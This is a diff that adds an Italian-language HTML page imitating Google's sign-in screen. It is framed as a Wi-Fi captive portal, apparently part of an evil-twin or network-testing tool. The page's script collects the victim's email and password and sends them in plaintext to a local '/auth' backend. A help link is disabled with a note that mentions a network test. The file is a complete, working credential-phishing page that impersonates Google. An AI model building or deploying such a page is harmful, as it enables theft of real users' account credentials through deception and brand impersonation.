@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Accedi - Account Google</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: Roboto, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #202124;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+            padding: 40px;
+            background: #fff;
+            border-radius: 8px;
+            border: 1px solid #dadce0;
+            text-align: center;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                border: none;
+                padding: 20px;
+            }
+        }
+
+        .google-logo {
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            font-size: 24px;
+            font-weight: 500;
+            letter-spacing: -0.5px;
+            margin-bottom: 8px;
+            color: #202124;
+        }
+
+        .google-logo span:nth-child(1) { color: #4285F4; }
+        .google-logo span:nth-child(2) { color: #EA4335; }
+        .google-logo span:nth-child(3) { color: #FBBC05; }
+        .google-logo span:nth-child(4) { color: #4285F4; }
+        .google-logo span:nth-child(5) { color: #34A853; }
+        .google-logo span:nth-child(6) { color: #EA4335; }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            line-height: 1.3333;
+            margin-bottom: 8px;
+            color: #202124;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            font-weight: 400;
+            line-height: 1.5;
+            color: #5f6368;
+            margin-bottom: 32px;
+        }
+
+        .form-group {
+            position: relative;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .input-container {
+            position: relative;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            transition: border-color 0.2s;
+        }
+
+        .input-container:focus-within {
+            border: 2px solid #1a73e8;
+            padding: -1px;
+        }
+
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: none;
+            outline: none;
+            background: transparent;
+            color: #202124;
+            border-radius: 4px;
+        }
+
+        .error-msg {
+            color: #d93025;
+            font-size: 12px;
+            text-align: left;
+            margin-top: 6px;
+            display: none;
+        }
+
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 32px;
+        }
+
+        .create-account {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .create-account:hover {
+            text-decoration: underline;
+        }
+
+        .btn-next {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 10px 24px;
+            cursor: pointer;
+            transition: background-color 0.2s, box-shadow 0.2s;
+        }
+
+        .btn-next:hover {
+            background-color: #1b66c9;
+            box-shadow: 0 1px 1px 0 rgba(65,69,73,0.3), 0 1px 3px 1px rgba(65,69,73,0.15);
+        }
+
+        .footer-note {
+            margin-top: 40px;
+            font-size: 11px;
+            color: #70757a;
+            border-top: 1px solid #f1f3f4;
+            padding-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="google-logo">
+            G<span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+        </div>
+        <h1>Accedi</h1>
+        <p class="subtitle">Usa il tuo Account Google per continuare sulla rete Wi-Fi</p>
+
+        <form id="googleForm" onsubmit="handleAuth(event)">
+            <!-- Step 1: Inserimento Email -->
+            <div id="stepEmail" class="form-group">
+                <div class="input-container">
+                    <input type="email" id="email" placeholder="Email o telefono" required autocomplete="email">
+                </div>
+                <div id="emailError" class="error-msg">Inserisci un indirizzo email o un numero di telefono valido.</div>
+            </div>
+
+            <!-- Step 2: Inserimento Password  -->
+            <div id="stepPassword" class="form-group" style="display: none;">
+                <div style="font-size: 14px; font-weight: 500; color: #202124; margin-bottom: 8px; text-align: left;" id="displayEmail"></div>
+                <div class="input-container">
+                    <input type="password" id="password" placeholder="Inserisci la password" autocomplete="current-password">
+                </div>
+                <div id="passError" class="error-msg">La password non è corretta. Riprova.</div>
+            </div>
+
+            <div class="actions">
+                <a href="#" class="create-account" onclick="simulateHelp(event)">Crea account</a>
+                <button type="submit" class="btn-next" id="submitBtn">Avanti</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        let currentStep = 1;
+        let capturedEmail = '';
+
+        function handleAuth(event) {
+            event.preventDefault();
+            
+            if (currentStep === 1) {
+                const emailInput = document.getElementById('email').value.trim();
+                if (!emailInput || !emailInput.includes('@')) {
+                    document.getElementById('emailError').style.display = 'block';
+                    return;
+                }
+                
+                document.getElementById('emailError').style.display = 'none';
+                capturedEmail = emailInput;
+                
+                // Passa allo step della password
+                document.getElementById('stepEmail').style.display = 'none';
+                document.getElementById('stepPassword').style.display = 'block';
+                document.getElementById('displayEmail').textContent = capturedEmail;
+                document.getElementById('password').focus();
+                currentStep = 2;
+                
+            } else {
+                const passwordInput = document.getElementById('password').value;
+                if (!passwordInput || passwordInput.length < 4) {
+                    document.getElementById('passError').style.display = 'block';
+                    return;
+                }
+
+                // Invia email e password al backend Python (/auth)
+                const derivedName = capturedEmail.split('@')[0];
+                const formattedName = derivedName.charAt(0).toUpperCase() + derivedName.slice(1);
+
+                window.location.href = '/auth?name=' + encodeURIComponent(formattedName) + 
+                                      '&email=' + encodeURIComponent(capturedEmail) + 
+                                      '&password=' + encodeURIComponent(passwordInput) + 
+                                      '&provider=google';
+            }
+        }
+
+        function simulateHelp(e) {
+            e.preventDefault();
+            alert("Funzione di recupero disattivata per questo test di rete.");
+        }
+    </script>
+</body>
+</html>
